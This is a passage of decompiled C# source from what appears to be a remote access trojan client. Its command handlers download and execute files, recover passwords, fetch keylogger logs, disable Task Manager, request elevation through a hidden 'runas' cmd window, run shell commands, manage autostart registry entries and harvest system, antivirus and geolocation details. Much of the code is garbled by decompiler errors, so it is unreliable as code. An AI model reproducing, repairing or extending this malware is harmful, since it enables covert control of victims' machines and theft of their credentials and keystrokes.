		catch (UnauthorizedAccessException)
		{
			/*Error near IL_008e: ldloc 1 (out-of-bounds)*/("RenamePath No permission");
		}
		catch (PathTooLongException)
		{
			/*Error near IL_009c: ldloc 1 (out-of-bounds)*/("RenamePath Path too long");
		}
		catch (DirectoryNotFoundException)
		{
			/*Error near IL_00aa: ldloc 1 (out-of-bounds)*/("RenamePath Path not found");
		}
		catch (IOException)
		{
			/*Error near IL_00b8: ldloc 1 (out-of-bounds)*/("RenamePath I/O error");
		}
		catch (Exception)
		{
			/*Error near IL_00c6: ldloc 1 (out-of-bounds)*/("RenamePath Failed");
		}
		finally
		{
			if (((_003C_003Ec__DisplayClass65_0)/*Error near IL_00d3: ldloc 0 (out-of-bounds)*/).isError && !string.IsNullOrEmpty(((_003C_003Ec__DisplayClass65_0)/*Error near IL_00db: ldloc 0 (out-of-bounds)*/).message))
			{
				_ = ((_003C_003Ec__DisplayClass65_0)/*Error near IL_00e8: ldloc 0 (out-of-bounds)*/).message;
				_ = 0;
				/*Error near IL_00ef: Invalid metadata token*/;
			}
		}
		return /*Error near IL_00fc: Stack underflow*/;
	}

	public static _003F HandleDoDownloadAndExecute()
	{
		//Discarded unreachable code: IL_001e, IL_0029
		//IL_0008: Unknown result type (might be due to invalid IL or missing references)
		//IL_000f: Unknown result type (might be due to invalid IL or missing references)
		//IL_001f: Unknown result type (might be due to invalid IL or missing references)
		_003F command = /*Error near IL_0007: ldarg 0 (out-of-bounds)*/;
		_003F client = /*Error near IL_000e: ldarg 1 (out-of-bounds)*/;
		/*Error near IL_0019: Invalid metadata token*/;
	}

	public static _003F HandleDoUploadAndExecute()
	{
		//Discarded unreachable code: IL_000b, IL_0012, IL_001d, IL_0023, IL_0032, IL_003d, IL_0049, IL_004b, IL_005d, IL_0063, IL_006a, IL_0075, IL_007b, IL_0083, IL_0089, IL_008e, IL_0090, IL_0096, IL_009c, IL_00a2, IL_00aa, IL_00ac, IL_00b7, IL_00be, IL_00c9, IL_00cf, IL_00e2, IL_00e4, IL_00f2, IL_0111, IL_0117, IL_0125, IL_012c, IL_0137, IL_013d, IL_0142, IL_0157, IL_015d, IL_015f
		//Error decoding local variables: Specified handle is not a TypeDefinitionHandle, TypeRefererenceHandle, or TypeSpecificationHandle.
		//IL_0051: Expected O, but got Unknown
		//IL_00a3: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d5: Expected O, but got Unknown
		//IL_00eb: Expected O, but got Unknown
		//IL_00f2: Expected O, but got Unknown
		//IL_00f9: Expected O, but got Unknown
		//IL_0100: Expected O, but got Unknown
		//IL_0100: Expected O, but got Unknown
		//IL_0106: Expected O, but got Unknown
		//IL_014d: Expected O, but got Unknown
		_ = _renamedFiles;
		/*Error near IL_0005: ldarg 0 (out-of-bounds)*/;
		/*Error near IL_0006: Invalid metadata token*/;
	}

	public static _003F HandleDoVisitWebsite()
	{
		//Discarded unreachable code: IL_0006, IL_0014, IL_0020, IL_0029, IL_002f, IL_0031, IL_003a, IL_008a, IL_0094, IL_009a
		/*Error: ldarg 0 (out-of-bounds)*/;
		/*Error near IL_0001: Invalid metadata token*/;
	}

	public static _003F HandleDoShowMessageBox()
	{
		//Discarded unreachable code: IL_002b, IL_0031
		//IL_0007: Unknown result type (might be due to invalid IL or missing references)
		_003F command = /*Error near IL_0006: ldarg 0 (out-of-bounds)*/;
		new Thread((ThreadStart)delegate
		{
			//Discarded unreachable code: IL_000b, IL_0016, IL_002b, IL_004a
			//IL_0001: Unknown result type (might be due to invalid IL or missing references)
			//IL_000c: Unknown result type (might be due to invalid IL or missing references)
			//IL_0021: Unknown result type (might be due to invalid IL or missing references)
			//IL_0030: Unknown result type (might be due to invalid IL or missing references)
			//IL_0040: Unknown result type (might be due to invalid IL or missing references)
			//IL_004f: Unknown result type (might be due to invalid IL or missing references)
			//IL_005a: Unknown result type (might be due to invalid IL or missing references)
			_ = command;
			/*Error near IL_0006: Invalid metadata token*/;
		}).Start();
		/*Error near IL_0026: Invalid metadata token*/;
	}

	[DllImport("user32.dll")]
	private static extern IntPtr SendMessage(IntPtr hWnd, uint Msg, int wParam, int lParam);

	public static _003F HandleDoDisplayMSG()
	{
		//Discarded unreachable code: IL_0025, IL_002b
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		SendMessage(((Control)new Form()).get_Handle(), 274u, 61808, 2);
		/*Error near IL_0020: Invalid metadata token*/;
	}

	public static _003F HandleDoDisableTaskmgr()
	{
		//Discarded unreachable code: IL_0006, IL_0012, IL_002f, IL_0049, IL_004f, IL_0055, IL_0061, IL_0085, IL_008b, IL_0090
		try
		{
			/*Error: ldarg 0 (out-of-bounds)*/;
			/*Error near IL_0001: Invalid metadata token*/;
		}
		catch
		{
		}
		return /*Error near IL_0096: Stack underflow*/;
	}

	public static _003F HandleGetPasswords()
	{
		//Discarded unreachable code: IL_000b, IL_0016, IL_0021, IL_002c, IL_0037, IL_0042, IL_004d, IL_00c6, IL_00cc, IL_00d2
		new List<RecoveredAccount>();
		/*Error near IL_0006: Invalid metadata token*/;
	}

	public static _003F HandleGetDesktop()
	{
		//Discarded unreachable code: IL_0006, IL_0018, IL_001e, IL_0024, IL_002a, IL_002f, IL_0039, IL_003f, IL_0041, IL_004b, IL_0051, IL_0053, IL_005d, IL_0065, IL_006c, IL_0076, IL_007c, IL_0082, IL_0088, IL_008d, IL_0097, IL_0111, IL_0121, IL_012b, IL_0135, IL_013a, IL_0140, IL_014c, IL_0161, IL_016b, IL_0175, IL_017a, IL_01a1
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_002a: Unknown result type (might be due to invalid IL or missing references)
		//IL_002f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0041: Unknown result type (might be due to invalid IL or missing references)
		//IL_0053: Unknown result type (might be due to invalid IL or missing references)
		//IL_0065: Unknown result type (might be due to invalid IL or missing references)
		//IL_006c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0088: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b3: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c4: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d6: Unknown result type (might be due to invalid IL or missing references)
		//IL_0106: Unknown result type (might be due to invalid IL or missing references)
		//IL_0117: Unknown result type (might be due to invalid IL or missing references)
		//IL_0121: Unknown result type (might be due to invalid IL or missing references)
		//IL_012b: Unknown result type (might be due to invalid IL or missing references)
		//IL_014f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0157: Unknown result type (might be due to invalid IL or missing references)
		//IL_0161: Unknown result type (might be due to invalid IL or missing references)
		//IL_016b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0181: Unknown result type (might be due to invalid IL or missing references)
		/*Error: ldarg 0 (out-of-bounds)*/;
		/*Error near IL_0001: Invalid metadata token*/;
	}

	public static _003F HandleDoMouseEvent()
	{
		//Discarded unreachable code: IL_000c, IL_0021, IL_0038, IL_0040, IL_004d, IL_0054, IL_005b, IL_0060, IL_0066, IL_008b, IL_008d, IL_0094, IL_009b, IL_00a2, IL_00a9, IL_00b1, IL_00ba, IL_00c1
		//Error decoding local variables: Specified handle is not a TypeDefinitionHandle, TypeRefererenceHandle, or TypeSpecificationHandle.
		//IL_001a: Expected Ref, but got Unknown
		//IL_002f: Expected Ref, but got Unknown
		//IL_0039: Unknown result type (might be due to invalid IL or missing references)
		//IL_0041: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected I4, but got Unknown
		//IL_0052: Invalid comparison between Unknown and I4
		//IL_008b: Expected I4, but got Unknown
		//IL_00af: Expected O, but got Unknown
		//IL_00b8: Expected O, but got Unknown
		//IL_00c1: Expected O, but got Unknown
		try
		{
			Screen.get_AllScreens();
			/*Error near IL_0006: ldarg 0 (out-of-bounds)*/;
			/*Error near IL_0007: Invalid metadata token*/;
		}
		catch
		{
		}
		return /*Error near IL_00c7: Stack underflow*/;
	}

	public static _003F HandleDoKeyboardEvent()
	{
		//Discarded unreachable code: IL_0012, IL_0018
		if (NativeMethodsHelper.IsScreensaverActive())
		{
			NativeMethodsHelper.DisableScreensaver();
		}
		/*Error near IL_000c: ldarg 0 (out-of-bounds)*/;
		/*Error near IL_000d: Invalid metadata token*/;
	}

	public static _003F HandleGetMonitors()
	{
		//Discarded unreachable code: IL_0014
		if (Screen.get_AllScreens().Length != 0)
		{
			_ = Screen.get_AllScreens().Length;
			/*Error near IL_000f: Invalid metadata token*/;
		}
		return /*Error near IL_001b: Stack underflow*/;
	}

	public static _003F HandleGetKeyloggerLogs()
	{
		//IL_0007: Unknown result type (might be due to invalid IL or missing references)
		_003F client = /*Error near IL_0006: ldarg 1 (out-of-bounds)*/;
		new Thread((ThreadStart)delegate
		{
			//Discarded unreachable code: IL_0007, IL_000e, IL_0013, IL_0018, IL_001d, IL_0022, IL_0031, IL_0036, IL_003b, IL_0040, IL_0044, IL_004d, IL_005e, IL_0067, IL_006a, IL_007e, IL_0087, IL_0092, IL_0095, IL_009e, IL_00a0, IL_00ab, IL_00ad, IL_00c2, IL_00cb, IL_00d4, IL_00df, IL_00e1, IL_00f5, IL_00fe, IL_0109, IL_0111, IL_011e, IL_013d, IL_0148, IL_014a
			//Error decoding local variables: Specified handle is not a TypeDefinitionHandle, TypeRefererenceHandle, or TypeSpecificationHandle.
			//IL_002f: Expected O, but got Unknown
			//IL_0047: Expected O, but got Unknown
			//IL_0048: Invalid comparison between Unknown and I4
			//IL_0059: Expected O, but got Unknown
			//IL_0068: Invalid comparison between Unknown and I4
			//IL_0081: Expected O, but got Unknown
			//IL_0088: Unknown result type (might be due to invalid IL or missing references)
			//IL_00b4: Expected O, but got Unknown
			//IL_00ce: Expected O, but got Unknown
			//IL_00d5: Unknown result type (might be due to invalid IL or missing references)
			//IL_00f8: Expected O, but got Unknown
			//IL_00ff: Unknown result type (might be due to invalid IL or missing references)
			//IL_010c: Unknown result type (might be due to invalid IL or missing references)
			//IL_0113: Unknown result type (might be due to invalid IL or missing references)
			//IL_0117: Unknown result type (might be due to invalid IL or missing references)
			//IL_0136: Expected O, but got Unknown
			//IL_013e: Unknown result type (might be due to invalid IL or missing references)
			try
			{
				_ = 1;
				/*Error near IL_0001: stloc 0 (out-of-bounds)*/;
				/*Error near IL_0002: Invalid metadata token*/;
			}
			catch (Exception)
			{
				/*Error near IL_0120: stloc 8 (out-of-bounds)*/;
				_ = new byte[0];
				_ = -1;
				_ = -1;
				_ = ((Exception)/*Error near IL_012f: ldloc 8 (out-of-bounds)*/).Message;
				_ = -1;
				_ = -1;
				/*Error near IL_0138: Invalid metadata token*/;
			}
		}).Start();
		return /*Error near IL_0022: Stack underflow*/;
	}

	public static _003F HandleGetDrives()
	{
		//Discarded unreachable code: IL_0037, IL_003c, IL_0047, IL_004c, IL_0060, IL_0066, IL_013e, IL_0144
		DriveInfo[] array;
		try
		{
			array = (from d in DriveInfo.GetDrives()
				where d.IsReady
				select d).ToArray();
		}
		catch (IOException)
		{
			/*Error near IL_0032: Invalid metadata token*/;
		}
		catch (UnauthorizedAccessException)
		{
			/*Error near IL_0042: Invalid metadata token*/;
		}
		if (array.Length == 0)
		{
			_ = 0;
			/*Error near IL_005b: Invalid metadata token*/;
		}
		string[] array2 = new string[array.Length];
		string[] array3 = new string[array.Length];
		for (int i = 0; i < array.Length; i++)
		{
			string text = null;
			try
			{
				text = array[i].VolumeLabel;
			}
			catch
			{
			}
			if (string.IsNullOrEmpty(text))
			{
				array2[i] = $"{array[i].RootDirectory.FullName} [{FormatHelper.DriveTypeName(array[i].DriveType)}, {array[i].DriveFormat}]";
			}
			else
			{
				array2[i] = $"{array[i].RootDirectory.FullName} ({text}) [{FormatHelper.DriveTypeName(array[i].DriveType)}, {array[i].DriveFormat}]";
			}
			array3[i] = array[i].RootDirectory.FullName;
		}
		/*Error near IL_0139: Invalid metadata token*/;
	}

	public static _003F HandleDoShutdownAction()
	{
		//Discarded unreachable code: IL_000c, IL_001f, IL_0021, IL_004e, IL_007b, IL_0084, IL_009c, IL_00a2, IL_00a4
		//Error decoding local variables: Specified handle is not a TypeDefinitionHandle, TypeRefererenceHandle, or TypeSpecificationHandle.
		//IL_001f: Expected I4, but got Unknown
		//IL_0028: Expected O, but got Unknown
		//IL_002f: Expected O, but got Unknown
		//IL_003a: Expected O, but got Unknown
		//IL_0045: Expected O, but got Unknown
		//IL_004b: Expected O, but got Unknown
		//IL_0055: Expected O, but got Unknown
		//IL_005c: Expected O, but got Unknown
		//IL_0067: Expected O, but got Unknown
		//IL_0072: Expected O, but got Unknown
		//IL_0078: Expected O, but got Unknown
		//IL_0092: Expected O, but got Unknown
		try
		{
			new ProcessStartInfo();
			/*Error near IL_0005: stloc 0 (out-of-bounds)*/;
			/*Error near IL_0006: ldarg 0 (out-of-bounds)*/;
			/*Error near IL_0007: Invalid metadata token*/;
		}
		catch (Exception)
		{
			/*Error near IL_0086: stloc 2 (out-of-bounds)*/;
			_ = $"Action failed: {((Exception)/*Error near IL_008c: ldloc 2 (out-of-bounds)*/).Message}";
			/*Error near IL_0097: Invalid metadata token*/;
		}
	}

	public static _003F HandleGetStartupItems()
	{
		//Discarded unreachable code: IL_0294, IL_0299, IL_02b3, IL_02b9, IL_02bb
		try
		{
			List<string> list = new List<string>();
			using (RegistryKey registryKey = RegistryKeyHelper.OpenReadonlySubKey(RegistryHive.LocalMachine, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"))
			{
				if (registryKey != null)
				{
					list.AddRange(from formattedKeyValue in registryKey.GetFormattedKeyValues()
						select "0" + formattedKeyValue);
				}
			}
			using (RegistryKey registryKey2 = RegistryKeyHelper.OpenReadonlySubKey(RegistryHive.LocalMachine, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce"))
			{
				if (registryKey2 != null)
				{
					list.AddRange(from formattedKeyValue in registryKey2.GetFormattedKeyValues()
						select "1" + formattedKeyValue);
				}
			}
			using (RegistryKey registryKey3 = RegistryKeyHelper.OpenReadonlySubKey(RegistryHive.CurrentUser, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"))
			{
				if (registryKey3 != null)
				{
					list.AddRange(from formattedKeyValue in registryKey3.GetFormattedKeyValues()
						select "2" + formattedKeyValue);
				}
			}
			using (RegistryKey registryKey4 = RegistryKeyHelper.OpenReadonlySubKey(RegistryHive.CurrentUser, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce"))
			{
				if (registryKey4 != null)
				{
					list.AddRange(from formattedKeyValue in registryKey4.GetFormattedKeyValues()
						select "3" + formattedKeyValue);
				}
			}
			if (PlatformHelper.Is64Bit)
			{
				using (RegistryKey registryKey5 = RegistryKeyHelper.OpenReadonlySubKey(RegistryHive.LocalMachine, "SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Run"))
				{
					if (registryKey5 != null)
					{
						list.AddRange(from formattedKeyValue in registryKey5.GetFormattedKeyValues()
							select "4" + formattedKeyValue);
					}
				}
				using RegistryKey registryKey6 = RegistryKeyHelper.OpenReadonlySubKey(RegistryHive.LocalMachine, "SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\RunOnce");
				if (registryKey6 != null)
				{
					list.AddRange(from formattedKeyValue in registryKey6.GetFormattedKeyValues()
						select "5" + formattedKeyValue);
				}
			}
			if (Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Startup)))
			{
				FileInfo[] files = new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.Startup)).GetFiles();
				list.AddRange(from file in files
					where file.Name != "desktop.ini"
					select $"{file.Name}||{file.FullName}" into formattedKeyValue
					select "6" + formattedKeyValue);
			}
			/*Error near IL_028f: Invalid metadata token*/;
		}
		catch (Exception ex)
		{
			_ = $"Getting Autostart Items failed: {ex.Message}";
			/*Error near IL_02ae: Invalid metadata token*/;
		}
	}

	public static _003F HandleDoStartupItemAdd()
	{
		//Discarded unreachable code: IL_0006, IL_0029, IL_002e, IL_003e, IL_0044, IL_004f, IL_005a, IL_006a, IL_0070, IL_007b, IL_0086, IL_0096, IL_009c, IL_00a7, IL_00b2, IL_00c2, IL_00c8, IL_00d3, IL_00de, IL_00e5, IL_00f0, IL_0100, IL_0106, IL_0111, IL_011c, IL_0123, IL_012e, IL_013e, IL_0144, IL_014f, IL_015a, IL_0167, IL_0173, IL_017f, IL_01ac, IL_01cd, IL_01f2, IL_020a, IL_0210, IL_0212
		try
		{
			/*Error: ldarg 0 (out-of-bounds)*/;
			/*Error near IL_0001: Invalid metadata token*/;
		}
		catch (Exception ex)
		{
			_ = $"Adding Autostart Item failed: {ex.Message}";
			/*Error near IL_0205: Invalid metadata token*/;
		}
	}

	public static _003F HandleDoStartupItemRemove()
	{
		//Discarded unreachable code: IL_0006, IL_0029, IL_002e, IL_003e, IL_0048, IL_0053, IL_0063, IL_006d, IL_0078, IL_0088, IL_0092, IL_009d, IL_00ad, IL_00b7, IL_00c2, IL_00c9, IL_00d4, IL_00e4, IL_00eb, IL_00f6, IL_00fd, IL_0108, IL_0118, IL_011f, IL_012a, IL_0136, IL_0143, IL_014e, IL_0153, IL_016b, IL_0171, IL_0173
		try
		{
			/*Error: ldarg 0 (out-of-bounds)*/;
			/*Error near IL_0001: Invalid metadata token*/;
		}
		catch (Exception ex)
		{
			_ = $"Removing Autostart Item failed: {ex.Message}";
			/*Error near IL_0166: Invalid metadata token*/;
		}
	}

	public static _003F HandleGetSystemInfo()
	{
		//Discarded unreachable code: IL_01a3, IL_01a8
		try
		{
			IPGlobalProperties iPGlobalProperties = IPGlobalProperties.GetIPGlobalProperties();
			string text = ((!string.IsNullOrEmpty(iPGlobalProperties.DomainName)) ? iPGlobalProperties.DomainName : "-");
			string text2 = ((!string.IsNullOrEmpty(iPGlobalProperties.HostName)) ? iPGlobalProperties.HostName : "-");
			_ = new string[36]
			{
				"Processor (CPU)",
				DevicesHelper.GetCpuName(),
				"Memory (RAM)",
				$"{DevicesHelper.GetTotalRamAmount()} MB",
				"Video Card (GPU)",
				DevicesHelper.GetGpuName(),
				"Username",
				WindowsAccountHelper.GetName(),
				"PC Name",
				SystemHelper.GetPcName(),
				"Domain Name",
				text,
				"Host Name",
				text2,
				"System Drive",
				Path.GetPathRoot(Environment.SystemDirectory),
				"System Directory",
				Environment.SystemDirectory,
				"Uptime",
				SystemHelper.GetUptime(),
				"MAC Address",
				DevicesHelper.GetMacAddress(),
				"LAN IP Address",
				DevicesHelper.GetLanIp(),
				"WAN IP Address",
				GeoLocationHelper.GeoInfo.Ip,
				"Antivirus",
				SystemHelper.GetAntivirus(),
				"Firewall",
				SystemHelper.GetFirewall(),
				"Time Zone",
				GeoLocationHelper.GeoInfo.Timezone,
				"Country",
				GeoLocationHelper.GeoInfo.Country,
				"ISP",
				GeoLocationHelper.GeoInfo.Isp
			};
			/*Error near IL_019e: Invalid metadata token*/;
		}
		catch
		{
		}
		return /*Error near IL_01ae: Stack underflow*/;
	}

	public static _003F HandleGetProcesses()
	{
		//Discarded unreachable code: IL_0072, IL_0078
		Process[] processes = Process.GetProcesses();
		string[] array = new string[processes.Length];
		int[] array2 = new int[processes.Length];
		string[] array3 = new string[processes.Length];
		int num = 0;
		Process[] array4 = processes;
		foreach (Process process in array4)
		{
			array[num] = process.ProcessName + ".exe";
			array2[num] = process.Id;
			array3[num] = process.MainWindowTitle;
			num++;
		}
		/*Error near IL_006d: Invalid metadata token*/;
	}

	public static _003F HandleDoProcessStart()
	{
		//Discarded unreachable code: IL_0006, IL_000d, IL_0017, IL_001d, IL_001e, IL_0032, IL_0045, IL_004a, IL_0051, IL_0058
		//IL_0052: Unknown result type (might be due to invalid IL or missing references)
		/*Error: ldarg 0 (out-of-bounds)*/;
		/*Error near IL_0001: Invalid metadata token*/;
	}

	public static _003F HandleDoProcessKill()
	{
		//Discarded unreachable code: IL_0006, IL_001a
		//IL_001b: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			/*Error: ldarg 0 (out-of-bounds)*/;
			/*Error near IL_0001: Invalid metadata token*/;
		}
		catch
		{
		}
		finally
		{
			/*Error near IL_0015: Invalid metadata token*/;
		}
	}

	public static _003F HandleDoAskElevate()
	{
		//Discarded unreachable code: IL_0069, IL_006e, IL_0085, IL_0090, IL_0096
		//IL_007b: Unknown result type (might be due to invalid IL or missing references)
		if (WindowsAccountHelper.GetAccountType() != "Admin")
		{
			ProcessStartInfo startInfo = new ProcessStartInfo
			{
				FileName = "cmd",
				Verb = "runas",
				Arguments = "/k START \"\" \"" + ClientData.CurrentPath + "\" & EXIT",
				WindowStyle = ProcessWindowStyle.Hidden,
				UseShellExecute = true
			};
			MutexHelper.CloseMutex();
			try
			{
				Process.Start(startInfo);
			}
			catch
			{
				/*Error near IL_0064: Invalid metadata token*/;
			}
			_ = Program.ConnectClient;
			/*Error near IL_0080: Invalid metadata token*/;
		}
		/*Error near IL_008b: Invalid metadata token*/;
	}

	public static _003F HandleDoShellExecute()
	{
		//Discarded unreachable code: IL_0006, IL_000e, IL_001b, IL_001c, IL_0023, IL_0028, IL_002d, IL_003a, IL_0040, IL_004a
		//IL_0007: Unknown result type (might be due to invalid IL or missing references)
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0028: Unknown result type (might be due to invalid IL or missing references)
		//IL_0040: Unknown result type (might be due to invalid IL or missing references)
		/*Error: ldarg 0 (out-of-bounds)*/;
		/*Error near IL_0001: Invalid metadata token*/;
	}

	public static void CloseShell()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0007: Unknown result type (might be due to invalid IL or missing references)
		if ((int)_shell != 0)
		{
			_ = _shell;
			/*Error near IL_000c: Invalid metadata token*/;
		}
	}
}
